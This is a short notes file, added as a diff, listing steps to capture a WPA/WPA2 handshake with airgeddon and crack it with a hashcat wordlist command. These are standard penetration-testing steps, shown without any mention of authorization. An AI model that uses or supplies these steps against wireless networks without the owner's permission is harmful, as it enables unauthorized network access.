@@ -1,0 +1,20 @@
+# https://github.com/v1s1t0r1sh3r3/airgeddon
+option #1 > Select another network interface > 
+option #2 > put interface in monitor mode
+
+then option #5: Handshake/PMKID tools menu 
+
+4.  Explore for targets (monitor mode needed) 
+
+------------ (monitor mode needed for capturing) ------------- 
+5.  Capture PMKID 
+6.  Capture Handshake 
+---------------------------------------------------------------
+Pick 6
+
+Got the handshake, Upload and convert a WPA / WPA2 pcap capture file to a hashcat capture fil
+
+https://hashcat.net/cap2hccapx/
+
+then use hashcat
+hashcat64.exe -m 2500 27372_1613440944.hccapx D:\Shared\SecLists\fav_wordlist\fav_wordlist.txt
